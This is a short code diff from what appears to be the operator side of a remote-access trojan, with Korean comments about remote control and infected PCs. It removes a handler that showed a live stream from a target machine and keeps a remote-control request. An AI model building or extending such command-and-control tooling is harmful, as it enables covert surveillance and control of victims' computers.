@@ -43,19 +43,7 @@ def main():
 
 # 원격조종
 def remote():
-  global isWhile
-  isWhile = False
   sio.emit('remote req', {'target': target['sid']})
-@sio.on('stream')
-def stream(data):
-  src = json.loads(data['src'])
-  src = np.asarray(src)
-  src = cv2.cvtColor(data['src'], cv2.COLOR_RGB2BGR)
-  cv2.imshow('monitor', src)
-
-  if cv2.waitKey(1) == 27:
-    sio.emit('stop remote', {'target': target['sid']})
-    cv2.destroyAllWindows()
 
 
 # 감염된 pc 정보들 가져오기
